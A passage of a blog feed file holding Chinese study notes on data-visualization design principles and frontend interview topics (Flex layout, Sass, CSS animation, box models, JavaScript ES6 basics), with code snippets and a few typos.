src="https://s3.bmp.ovh/imgs/2023/02/13/047ff6801801a0ae.jpg"></p><ul><li>错误的可视化</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/13/49b2ca22ec9c3ff1.jpg"></p><h3 id="1-可视化设计原则"><a href="#1-可视化设计原则" class="headerlink" title="1.可视化设计原则"></a>1.可视化设计原则</h3><blockquote><p>能够正确的表达数据中的信息而不产生偏差与歧义；</p></blockquote><h3 id="2-透视失真"><a href="#2-透视失真" class="headerlink" title="2.透视失真"></a>2.透视失真</h3><ul><li>如果数字是由视觉元素表示的，那么他们应该与是视觉元素的感知程度成正比；</li><li>使用清晰、详细和彻底的标签，以避免图形失真和含糊不清；</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/13/e9ae1811c30f03fd.jpg"></p><blockquote><p>绿色部分的数据小于蓝色部分，但是视觉上绿色接近于蓝色；</p></blockquote><h3 id="3-图形设计-amp-数据尺度"><a href="#3-图形设计-amp-数据尺度" class="headerlink" title="3.图形设计&amp;数据尺度"></a>3.图形设计&amp;数据尺度</h3><blockquote><p>图形的每一部分都会产生对其的视觉预期；</p></blockquote><ul><li>预期往往决定了眼睛实际看到的东西；</li><li>错误的数据洞察，产生于在图形的某个地方不正确的视觉预期；</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/13/4f7068afb0f91c60.jpg"></p><blockquote><p>数据的刻度分布不均匀；</p></blockquote><h3 id="4-数据上下文"><a href="#4-数据上下文" class="headerlink" title="4.数据上下文"></a>4.数据上下文</h3><p><img src="https://s3.bmp.ovh/imgs/2023/02/13/1af9dfd1933e4bc4.jpg"></p><blockquote><p>数据范围显示不全，导致误解；</p></blockquote><h3 id="5-可视化设计原则"><a href="#5-可视化设计原则" class="headerlink" title="5.可视化设计原则"></a>5.可视化设计原则</h3><ul><li>准确的展示数据</li><li>节省笔墨</li><li>节省空间</li><li>消除不必要的无价值图形</li><li>在最短的事件传达最多的信息</li></ul><h5 id="Data-ink-Ratio"><a href="#Data-ink-Ratio" class="headerlink" title="Data-ink Ratio"></a>Data-ink Ratio</h5><ul><li>数据墨水：可视化图形中不可擦除的核心部分；</li><li>最大化数据墨水占比：可视化图形由墨水+空白区域构成；</li><li>擦除数据墨水将会减少图形所传达的信息量；</li></ul><p>$$<br>Data-ink-ratio=Data-ink/Total-ink-used-to-print-the-graphics<br>$$</p><p><img src="https://s3.bmp.ovh/imgs/2023/02/13/08a573bf6afb2dff.jpg"></p><h3 id="6-视觉感知"><a href="#6-视觉感知" class="headerlink" title="6.视觉感知"></a>6.视觉感知</h3><h5 id="相对判断和视觉假象"><a href="#相对判断和视觉假象" class="headerlink" title="相对判断和视觉假象"></a>相对判断和视觉假象</h5><blockquote><p>人类的视觉系统管擦的是变化而不是绝对值，且容易被边界吸引；</p></blockquote><h5 id="格式塔学派"><a href="#格式塔学派" class="headerlink" title="格式塔学派"></a>格式塔学派</h5><blockquote><p>整体决定了部分的性质，部分依从于整体；</p><p>结构比元素重要，视觉形象首先作为统一的整体被认知；</p></blockquote><p><img src="https://s3.bmp.ovh/imgs/2023/02/13/76fa7f84b9de92b5.jpg"></p><ul><li>就近原则：视觉元素空间距离上相近时，人们倾向于归于一组；同理，将数据元素放在靠近的位置，可以突出关联性；</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/13/643b5bf9da7aff3b.jpg"></p><ul><li>相似原则：形状、大小、颜色等属性相似时更容易被看作是一个整体；</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/13/c66cc71e223ca688.jpg"></p><ul><li>连续性原则：观察师傅的时候回很自然的沿着物体的边界，将不连续的物体视为连续的整体；</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/13/3c9504bd2d3fc1cb.jpg"></p><ul><li> 闭合性原则：有些图形本身不是闭合的名单时主体倾向闭合；</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/13/1bad0530b6e85e67.jpg"></p><ul><li>共势原则：如果一个对象中的一部分都向共同的方向去运动，那么共同的部分就容易被感知；</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/13/7f5ee721448a7331.jpg"></p><ul><li>对称性原则：堆成的数据视为同一组；</li><li>图形与背景关系原则：大脑通常认为构图中最小的物体是图形，更大的是背景；相比于凹面，凸面与图形相关联更多；</li></ul><h3 id="7-视觉编码"><a href="#7-视觉编码" class="headerlink" title="7.视觉编码"></a>7.视觉编码</h3><blockquote><p>将数据信息（属性+值）映射成可视化元素（可视化符号+视觉通道）的技术；</p></blockquote><h3 id="1-可视化符号"><a href="#1-可视化符号" class="headerlink" title="1.可视化符号"></a>1.可视化符号</h3><ul><li>点、线、面表示元素</li><li>闭包、连线表示关系</li></ul><h3 id="2-视觉通道"><a href="#2-视觉通道" class="headerlink" title="2.视觉通道"></a>2.视觉通道</h3><p><img src="https://s3.bmp.ovh/imgs/2023/02/13/334060202691f9df.jpg"></p><h3 id="3-视觉编码的优先级"><a href="#3-视觉编码的优先级" class="headerlink" title="3.视觉编码的优先级"></a>3.视觉编码的优先级</h3><p><img src="https://s3.bmp.ovh/imgs/2023/02/13/a1ced555ecc5c0b6.jpg"></p><h2 id="三、可视化工具"><a href="#三、可视化工具" class="headerlink" title="三、可视化工具"></a>三、可视化工具</h2><ul><li>D3.js：最好的之一；</li><li>Vega：声明式的语言，可以用JSON描述可视化的视觉外观和交互行为；</li><li>G2：图形语法库（没有图表类型的概念）</li><li>Echarts（强图表类型）</li></ul>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>可视化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>前端面筋</title>
    <link href="/2023/03/27/%E5%89%8D%E7%AB%AF%E9%9D%A2%E7%BB%8F/"/>
    <url>/2023/03/27/%E5%89%8D%E7%AB%AF%E9%9D%A2%E7%BB%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="前端三大件"><a href="#前端三大件" class="headerlink" title="前端三大件"></a>前端三大件</h1><h2 id="一、HTML"><a href="#一、HTML" class="headerlink" title="一、HTML"></a>一、HTML</h2><h2 id="二、CSS"><a href="#二、CSS" class="headerlink" title="二、CSS"></a>二、CSS</h2><h3 id="1-Flex布局"><a href="#1-Flex布局" class="headerlink" title="1.Flex布局"></a>1.Flex布局</h3><blockquote><p>Flex布局包括容器和Item两部分；一个容器的所有子元素都成为他的item成员；</p></blockquote><p><img src="https://s3.bmp.ovh/imgs/2023/03/16/1d4271c9004b7a95.png"></p><ul><li>flex-direction:主轴方向，row，row-reverse，column，column-recerse；</li><li>flex-wrap:默认所有的容器里的Item都在一条线上，一行放不下可以换行：nowrap（默认不换行）wrap（换行，第一行在上）</li><li>flex-flow:前两者的缩写，默认row nowrap</li><li>justify-content:主轴对其方式，有五个值，flex-start:主轴起始位置对齐；flex-end:主轴结束位置对齐；center:居中；space-between:始末位置各一个，中间按照平均间距防止；space-around:每个item周围的间隔相同；</li><li>align-items:纵轴如何对齐，五个值：flex-start:从最上方开始，排列row；flex-end:最底下开始；center:中间线；baseline:项目的第一行文字的基线对其；stretch:默认，item妹有设置高度或者auto，占满容器；</li><li>align-content:定义多根轴线对齐方式，一行则不生效；</li><li>order属性：属于item，按照order大小排序；</li><li>flex-grow:定义item的放大比例；</li><li>flex-shrink:按照比例缩小；</li><li>flex: flex-grow,flex-shrink,flex-basis;</li><li>align-self:允许item自己的属性；可覆盖aligin-items;</li></ul><h3 id="2-CSS预处理器"><a href="#2-CSS预处理器" class="headerlink" title="2.CSS预处理器"></a>2.CSS预处理器</h3><blockquote><p>CSS预处理器式一种基于CSS，用于解决CSS难以解决的问题的Domian Specific Language;</p><p>通过用一种专门的编程语言，为CSS添加一些编程特性，再编译成CSS文件；</p><p>如：语法不够强大，妹有变量和合理的样式复用机制等；</p></blockquote><h5 id="CSS预处理器的作用"><a href="#CSS预处理器的作用" class="headerlink" title="CSS预处理器的作用"></a>CSS预处理器的作用</h5><ul><li>提供css缺失的样式层复用机制，减少冗余代码；</li><li>提高样式代码的可维护性；</li></ul><h5 id="Sass（-scss）"><a href="#Sass（-scss）" class="headerlink" title="Sass（.scss）"></a>Sass（.scss）</h5><p>成熟稳定强大的专业级CSS拓展语言，兼容CSS、功能丰富；</p><p>功能：</p><ul><li>变量、常量</li></ul><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-variable">$bgColor</span>:<span class="hljs-number">#fff</span>;<span class="hljs-comment">//以$开头，表示全局和局部变量</span><br><span class="hljs-selector-tag">div</span>&#123;<br>    <span class="hljs-variable">$width</span>:<span class="hljs-number">100px</span>;<span class="hljs-comment">//局部变量</span><br>    <span class="hljs-attribute">width</span>:<span class="hljs-variable">$width</span>;<br>    <span class="hljs-attribute">background</span>:<span class="hljs-variable">$bgColor</span>;<br>&#125;<br><br><span class="hljs-comment">//变量用在属性中，需要写在#&#123;&#125;中</span><br><span class="hljs-variable">$posi</span><span class="hljs-selector-pseudo">:left</span>;<br><span class="hljs-selector-tag">div</span>&#123;<br>    <span class="hljs-attribute">border</span>-#&#123;<span class="hljs-variable">$posi</span>&#125;:<span class="hljs-number">1</span> px solid <span class="hljs-variable">$color</span>;<br>&#125;<br><br><span class="hljs-comment">//默认变量，值后面加上 ！default</span><br><span class="hljs-variable">$myLineHeight</span>:<span class="hljs-number">1.5</span> !default;<br><br><span class="hljs-selector-tag">body</span>&#123;<br>    <span class="hljs-attribute">line-height</span>:<span class="hljs-variable">$myLineHeight</span>;<br>&#125;<br><br><span class="hljs-selector-tag">body</span>&#123;<br>    <span class="hljs-attribute">line-height</span>:<span class="hljs-number">1.5</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>CSS代码嵌套</li></ul><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-comment">//在一个选择器中嵌套另一个选择器来实现继承，增强了sass文件的结构性和可读性；</span><br><span class="hljs-comment">//选择器嵌套中，可以使用&amp;表示父元素选择器；</span><br><span class="hljs-selector-id">#top_btn</span>&#123;<br>    <span class="hljs-attribute">line-height</span>:<span class="hljs-number">40px</span>;<br>    <span class="hljs-attribute">text-transform</span>:capitalize;<br>    <span class="hljs-selector-tag">li</span>&#123;<br>        <span class="hljs-attribute">float</span><span class="hljs-selector-pseudo">:left</span>;<br>    &#125;<br>    <span class="hljs-selector-tag">a</span>&#123;<br>        <span class="hljs-attribute">display</span>：block;<br>        <br>        &amp;<span class="hljs-selector-pseudo">:hover</span>&#123;<br>            <span class="hljs-attribute">color</span>:<span class="hljs-number">#ddd</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//属性嵌套</span><br><span class="hljs-selector-class">.main-container</span>&#123;<br>    <span class="hljs-comment">//选择器嵌套</span><br>    &amp;-<span class="hljs-attribute">top</span>&#123;<br>        <span class="hljs-attribute">color</span>:red;<br>    &#125;<br>    <span class="hljs-comment">//伪类嵌套</span><br>    &amp;<span class="hljs-selector-pseudo">:hover</span>&#123;<br>        <span class="hljs-attribute">color</span>:green<span class="hljs-string">&#x27;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><ul><li>混入Mixin</li></ul><blockquote><p>Mixins是CSS预处理器最强大的特性；</p><p>可以将一部分样式抽出，作为单独定义的模块，被很多选择器重复使用；</p></blockquote><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-comment">//无参数mixin</span><br><span class="hljs-keyword">@mixin</span> center-block&#123;<br>    <span class="hljs-attribute">margin-left</span>:auto;<br>    <span class="hljs-attribute">margin-right</span>:auto;<br>&#125;<br><span class="hljs-selector-class">.btn</span>&#123;<br>    <span class="hljs-keyword">@include</span> center-block;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-comment">//有参数mixin</span><br><span class="hljs-keyword">@mixin</span> theme(<span class="hljs-variable">$theme</span>:Darkgray)&#123;<br>    <span class="hljs-attribute">background</span>:<span class="hljs-variable">$theme</span>;<br>    <span class="hljs-attribute">box-shadow</span>:<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">1px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-variable">$theme</span>, .<span class="hljs-number">25</span>);<br>    <span class="hljs-attribute">color</span>:<span class="hljs-number">#fff</span>;<br>&#125;<br><br><span class="hljs-selector-class">.infor</span>&#123;<br>    <span class="hljs-keyword">@include</span> theme;<br>&#125;<br><br><span class="hljs-selector-class">.alert</span>&#123;<br>    <span class="hljs-keyword">@include</span> theme(<span class="hljs-variable">$theme</span>:Darkred);<br>&#125;<br><br><span class="hljs-comment">//多个mixin,多个参数以逗号分隔，如果@include传入的参数个数小于@mixin定义参数的个数，则按照顺序表示，后面不足的使用默认值；如果不足的没有默认值则报错；</span><br><span class="hljs-keyword">@mixin</span> theme(<span class="hljs-variable">$theme</span>:Darkgray,<span class="hljs-variable">$color</span>:red)&#123;<br>    <span class="hljs-attribute">background</span>:<span class="hljs-variable">$theme</span>;<br>    <span class="hljs-attribute">box-shadow</span>:<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">1px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-variable">$theme</span>, .<span class="hljs-number">25</span>);<br>    <span class="hljs-attribute">color</span>:<span class="hljs-variable">$red</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-comment">//模块系统</span><br><span class="hljs-comment">//test.scss</span><br><span class="hljs-variable">$font-stack</span>: Helvetica, sans-serif;<br><span class="hljs-variable">$primary-color</span>: <span class="hljs-number">#333</span>;<br><br><span class="hljs-selector-tag">body</span> &#123;<br>  <span class="hljs-attribute">font</span>: <span class="hljs-number">100%</span> <span class="hljs-variable">$font-stack</span>;<br>  <span class="hljs-attribute">color</span>: <span class="hljs-variable">$primary-color</span>;<br>&#125;<br><br><span class="hljs-comment">//styles.scss</span><br><span class="hljs-comment">// 使用@use导入文件</span><br><span class="hljs-keyword">@use</span> <span class="hljs-string">&#x27;test&#x27;</span>; <span class="hljs-comment">// 生成了一个 test 命名空间</span><br><br><span class="hljs-selector-class">.inverse</span> &#123;<br>  <span class="hljs-attribute">background-color</span>: test.<span class="hljs-variable">$primary-color</span>;<br>  <span class="hljs-attribute">color</span>: white;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>继承</li></ul><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-comment">/* This CSS will print because %message-shared is extended. */</span><br>%message-shared &#123;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ccc</span>;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>  <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;<br>&#125;<br><br><span class="hljs-comment">// This CSS won&#x27;t print because %equal-heights is never extended.</span><br>%equal-heights &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">flex-wrap</span>: wrap;<br>&#125;<br><br><span class="hljs-selector-class">.message</span> &#123;<br>  <span class="hljs-keyword">@extend</span> %message-shared;<br>&#125;<br><br><span class="hljs-selector-class">.success</span> &#123;<br>  <span class="hljs-keyword">@extend</span> %message-shared;<br>  <span class="hljs-attribute">border-color</span>: green;<br>&#125;<br><br><span class="hljs-selector-class">.error</span> &#123;<br>  <span class="hljs-keyword">@extend</span> %message-shared;<br>  <span class="hljs-attribute">border-color</span>: red;<br>&#125;<br><br><span class="hljs-selector-class">.warning</span> &#123;<br>  <span class="hljs-keyword">@extend</span> %message-shared;<br>  <span class="hljs-attribute">border-color</span>: yellow;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>函数</li></ul><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs scss">x <span class="hljs-keyword">@use</span> <span class="hljs-string">&quot;sass:math&quot;</span>;<br><br><span class="hljs-selector-class">.container</span>&#123;<br>    <span class="hljs-attribute">display</span>:flex;<br>&#125;<br><br><span class="hljs-selector-tag">article</span><span class="hljs-selector-attr">[role=<span class="hljs-string">&quot;main&quot;</span>]</span>&#123;<br>    <span class="hljs-attribute">width</span>:math.<span class="hljs-built_in">div</span>(<span class="hljs-number">600px</span>,<span class="hljs-number">960px</span>)*<span class="hljs-number">100%</span>;<br>&#125;<br><br><span class="hljs-selector-tag">aside</span><span class="hljs-selector-attr">[role=<span class="hljs-string">&quot;complementary&quot;</span>]</span>&#123;<br>    <span class="hljs-attribute">width</span>:math.<span class="hljs-built_in">div</span>(<span class="hljs-number">300px</span>,<span class="hljs-number">960px</span>)*<span class="hljs-number">100%</span>;<br>    <span class="hljs-attribute">margin-left</span>:auto;<br>&#125;<br><span class="hljs-comment">//支持加减乘除，循环等；</span><br></code></pre></td></tr></table></figure><p>缺点：采用Ruby语言编写，单独使用妹有问题，但是工程化项目中，存在问题；</p><ul><li>需要借助node-sass,node版本与node-sass版本相关联，一旦本地nodeJS升级，出现node-sass无法工作；（Rebuild或者冲洗安装node-sass）</li><li>需要node-gyp作为先决条件-&gt;需要兼容版本的python；</li><li>binding.node源无法访问或者速度慢；</li></ul><h5 id="Less"><a href="#Less" class="headerlink" title="Less"></a>Less</h5><p>Less是CSS预处理语言，拓展了CSS，增加了变量、Mixin、函数等特性；使CSS更易维护和拓展。Less可以运行在Node或浏览器端；</p><h5 id="Stylus"><a href="#Stylus" class="headerlink" title="Stylus"></a>Stylus</h5><p>Stylus是一种创新的样式表语言，可编译为CSS。Stylus是用nodeJS构建的；</p><h3 id="3-多屏适应，自适应布局和响应式布局区别"><a href="#3-多屏适应，自适应布局和响应式布局区别" class="headerlink" title="3.多屏适应，自适应布局和响应式布局区别"></a>3.多屏适应，自适应布局和响应式布局区别</h3><h3 id="4-过渡动画"><a href="#4-过渡动画" class="headerlink" title="4.过渡动画"></a>4.过渡动画</h3><ul><li>transform（平移旋转缩放）</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css">.&#123;<br>    translate(<span class="hljs-number">50px</span>,<span class="hljs-number">100px</span>);<span class="hljs-comment">/*平移，x y方向*/</span><br>    rotate(<span class="hljs-number">20deg</span>);<span class="hljs-comment">/*旋转 顺时针旋转20°*/</span><br>    rotateX(<span class="hljs-number">150deg</span>);<span class="hljs-comment">/*x轴旋转*/</span><br>    scaleX(<span class="hljs-number">2</span>);<span class="hljs-comment">/*增大两倍宽度*/</span><br>    scale(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);<span class="hljs-comment">/*宽度一赔，高度两倍*/</span><br>    <br>&#125;<br></code></pre></td></tr></table></figure><ul><li>animation</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css">*<span class="hljs-attribute">animation-name</span>：关键帧的名字，该参数必需。<br>*<span class="hljs-attribute">animation-duration</span>：动画持续的时间，该参数必需。<br><span class="hljs-attribute">animation-timing-function</span>：定时器函数，默认是ease。<br><span class="hljs-attribute">animation-delay</span>：动画效果多少秒后开始，默认为<span class="hljs-number">0</span>。<br><span class="hljs-attribute">animation-iteration-count</span>：动画重复的次数，可以指定为一个整数，表示多少次，默认值是infinite关键字，表示无限次。<br><span class="hljs-attribute">animation-direction</span>：动画方向，可能的值为forward、backward或alternating，默认值为<span class="hljs-attribute">normal</span>。<br><span class="hljs-attribute">animation-fill-mode</span>：默认值为<span class="hljs-attribute">none</span>。<br><span class="hljs-attribute">animation-play-state</span>：动画默认是否生效，默认值为running。<br><br></code></pre></td></tr></table></figure><ul><li><code>animation</code> 强调流程与控制，对元素的一个或多个属性的变化进行控制，可以有多个<a href="https://so.csdn.net/so/search?q=%E5%85%B3%E9%94%AE%E5%B8%A7&spm=1001.2101.3001.7020">关键帧</a>（<code>animation</code> 和 <code>@keyframes</code>结合使用）</li><li><code>transition</code> 强调过渡，是元素的一个或多个属性发生变化时产生的过渡效果，同一个元素通过两个不同的途径获取样式；</li></ul><h3 id="5-标准盒模型和怪异盒模型"><a href="#5-标准盒模型和怪异盒模型" class="headerlink" title="5.标准盒模型和怪异盒模型"></a>5.标准盒模型和怪异盒模型</h3><p>W3C标准盒子模型由：content、margin、padding、border组成；</p><h5 id="区别：总宽度的计算公式不一样"><a href="#区别：总宽度的计算公式不一样" class="headerlink" title="区别：总宽度的计算公式不一样"></a>区别：总宽度的计算公式不一样</h5><p>标准盒模型总宽度=width+margin（左右）+padding（左右）+border（左右）；</p><p><img src="https://img-blog.csdnimg.cn/20201224112703410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDgwODQ4Mw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>怪异盒模型总宽度=width+margin（左右）（width已经包含padding和border的值）；</p><p><img src="https://img-blog.csdnimg.cn/20201224113002950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDgwODQ4Mw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs css">    <span class="hljs-selector-class">.box</span> &#123;<br>        <span class="hljs-attribute">margin</span>: <span class="hljs-number">30px</span>;<br>        <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;<br>        <span class="hljs-attribute">width</span>: <span class="hljs-number">80px</span>;<br>        <span class="hljs-attribute">height</span>: <span class="hljs-number">40px</span>;<br>        <span class="hljs-attribute">border</span>: <span class="hljs-number">10px</span> solid <span class="hljs-number">#00007e</span>;<br>        <span class="hljs-attribute">background</span>: <span class="hljs-number">#fec997</span>;<br>        <span class="hljs-attribute">box-sizing</span>: border-box <span class="hljs-comment">/* 设置盒子类型 */</span><br>      &#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">content-box:标准盒模型；</span><br><span class="hljs-comment">border-box:怪异盒模型；</span><br><span class="hljs-comment">padding-box:盒子宽度等于content+padding;</span><br><span class="hljs-comment">inherit:从父元素继承box-sizeing的属性；</span><br><span class="hljs-comment">*/</span><br><br></code></pre></td></tr></table></figure><h2 id="三、JS"><a href="#三、JS" class="headerlink" title="三、JS"></a>三、JS</h2><h3 id="1-基本数据类型"><a href="#1-基本数据类型" class="headerlink" title="1.基本数据类型"></a>1.基本数据类型</h3><ul><li>基本数据类型</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-built_in">number</span>,<span class="hljs-built_in">string</span>,<span class="hljs-literal">undefined</span>,<span class="hljs-title class_">Boolean</span>,<span class="hljs-literal">null</span>;<br><span class="hljs-title class_">ES6</span>添加：<span class="hljs-title class_">Symbol</span><br></code></pre></td></tr></table></figure><ul><li>复杂数据类型</li></ul><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">Object</span>；<br></code></pre></td></tr></table></figure><blockquote><p>0.1+0.2！=0.3</p><p>浮点数值的最高精度事28位小数，0.1+0.2= 0.30000 0000 0000 0004</p><p>基于IEEE754数值的浮点计算通病；</p></blockquote><h3 id="2-ES6新特性"><a href="#2-ES6新特性" class="headerlink" title="2.ES6新特性"></a>2.ES6新特性</h3><blockquote><p>ES6=ES2015</p></blockquote><ul><li>新增块级作用域let,const;</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//let </span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i);<br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i+<span class="hljs-number">1</span>);<span class="hljs-comment">//循环体外部能够访问i，使用let不会</span><br><br><span class="hljs-comment">//const声明的是常量，不能被修改；</span><br><span class="hljs-keyword">const</span> a=<span class="hljs-number">1</span>;<br><br><span class="hljs-comment">//const 声明的数组不可以被重新赋值，但是可以修改元素；</span><br><span class="hljs-keyword">const</span> names=[<span class="hljs-string">&quot;A&quot;</span>,<span class="hljs-string">&quot;B&quot;</span>];<br><br></code></pre></td></tr></table></figure><ul><li>定义类的语法糖；</li><li>新增基本数据类型Symbol；</li><li>新增变量解构赋值；</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//数组</span><br><span 